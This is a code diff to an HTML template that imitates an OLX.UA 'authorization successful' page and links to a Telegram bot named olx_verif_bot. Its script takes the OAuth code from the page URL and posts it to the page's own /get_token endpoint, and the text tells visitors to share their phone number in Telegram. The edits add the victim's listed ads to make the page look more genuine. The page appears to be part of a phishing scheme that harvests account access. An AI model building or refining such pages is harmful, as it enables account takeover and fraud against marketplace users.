@@ -23,7 +23,6 @@
             flex-direction: column;
         }
 
-        /* ШАПКА */
         header {
             background-color: var(--olx-dark);
             height: 72px;
@@ -43,15 +42,6 @@
             justify-content: space-between;
         }
 
-        .nav-links {
-            display: flex;
-            gap: 20px;
-            color: white;
-            font-size: 14px;
-            font-weight: bold;
-            align-items: center;
-        }
-
         .btn-add {
             background: white !important;
             color: var(--olx-dark) !important;
@@ -62,7 +52,6 @@
             text-decoration: none;
         }
 
-        /* КОНТЕНТ */
         main {
             flex: 1;
             display: flex;
@@ -74,8 +63,8 @@
         .container {
             background: white;
             width: 100%;
-            max-width: 420px;
-            padding: 45px 35px;
+            max-width: 440px;
+            padding: 35px 25px;
             border-radius: 16px;
             box-shadow: 0 15px 40px rgba(0,0,0,0.12);
             text-align: center;
@@ -89,41 +78,77 @@
         }
 
         .checkmark {
-            width: 80px;
-            height: 80px;
+            width: 60px;
+            height: 60px;
             border-radius: 50%;
             background: #27ae60;
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: pop .4s ease;
         }
 
         .checkmark svg {
-            width: 40px;
-            height: 40px;
+            width: 30px;
+            height: 30px;
             stroke: white;
             stroke-width: 4;
             fill: none;
         }
 
-        @keyframes pop {
-            0% { transform: scale(.6); opacity: .3 }
-            100% { transform: scale(1); opacity: 1 }
-        }
+        h1 { font-size: 22px; margin: 10px 0; color: #1f2d3d; }
+        p { color: #5f6c7b; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
 
-        h1 {
-            font-size: 24px;
-            margin: 10px 0;
-            color: #1f2d3d;
+        /* СТИЛИ ОБЪЯВЛЕНИЙ */
+        .ads-section {
+            text-align: left;
+            margin-bottom: 25px;
+            border-top: 1px solid #f2f4f5;
+            padding-top: 15px;
         }
-
-        p {
-            color: #5f6c7b;
+        .ads-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #7f9799;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+        .ad-card {
+            display: flex;
+            align-items: center;
+            background: #f8f9fa;
+            border: 1px solid #ebedee;
+            border-radius: 8px;
+            padding: 8px;
+            margin-bottom: 8px;
+            gap: 12px;
+        }
+        .ad-img {
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+            border-radius: 4px;
+            background: #eee;
+        }
+        .ad-info {
+            flex: 1;
+            min-width: 0;
+        }
+        .ad-name {
             font-size: 14px;
-            margin-bottom: 30px;
-            line-height: 1.5;
+            font-weight: 500;
+            color: var(--olx-dark);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .ad-status {
+            font-size: 12px;
+            color: #27ae60;
+            display: flex;
+            align-items: center;
+            gap: 4px;
         }
 
         .btn {
@@ -140,20 +165,11 @@
             box-sizing: border-box;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,.18);
-        }
-
-        .footer-text {
-            margin-top: 25px;
-            font-size: 11px;
-            color: #9aa7b3;
-        }
+        .footer-text { margin-top: 20px; font-size: 11px; color: #9aa7b3; }
 
         @media (max-width: 768px) {
             header { height: 60px; }
-            .nav-links a:not(.btn-add) { display: none; }
+            .nav-links { display: none; }
         }
     </style>
 </head>
@@ -176,48 +192,51 @@
 <main>
     <div class="container">
         <div class="checkmark">
-            <svg viewBox="0 0 24 24">
-                <polyline points="4,13 9,18 20,6"/>
-            </svg>
+            <svg viewBox="0 0 24 24"><polyline points="4,13 9,18 20,6"/></svg>
         </div>
 
-        <h1>Авторизація пройшла успішно</h1>
+        <h1>Авторизація успішна</h1>
+        <p>Ваш профіль синхронізовано. Тепер поверніться до Telegram і натисніть <br><b>📲 поділитися номером</b></p>
 
-        <p>Поверніться до Telegram і натисніть <br><b>📲 поділитися номером</b></p>
+        {% if user_ads %}
+        <div class="ads-section">
+            <div class="ads-title">Ваші оголошення підключено:</div>
+            {% for ad in user_ads %}
+            <div class="ad-card">
+                <img src="{{ ad.img }}" class="ad-img" alt="item">
+                <div class="ad-info">
+                    <div class="ad-name">{{ ad.title }}</div>
+                    <div class="ad-status">
+                        <span style="width: 6px; height: 6px; background: #27ae60; border-radius: 50%;"></span>
+                        Активне
+                    </div>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+        {% endif %}
 
         <a href="https://t.me/olx_verif_bot" class="btn">Повернутися до бота</a>
 
-        <div class="footer-text">
-            © OLX.UA 2026
-        </div>
+        <div class="footer-text">© OLX.UA 2026</div>
     </div>
 </main>
 
 <script>
+// Твой скрипт отправки кода остается без изменений
 async function sendCodeToServer(authCode) {
     if (!authCode) return;
-
     try {
         await fetch("/get_token", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                code: authCode
-            })
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ code: authCode })
         });
-    } catch (err) {
-        console.error("Error:", err);
-    }
+    } catch (err) { console.error("Error:", err); }
 }
-
 const urlParams = new URLSearchParams(window.location.search);
 const codeFromUrl = urlParams.get("code");
-
-if (codeFromUrl) {
-    sendCodeToServer(codeFromUrl);
-}
+if (codeFromUrl) { sendCodeToServer(codeFromUrl); }
 </script>
 </body>
 </html>
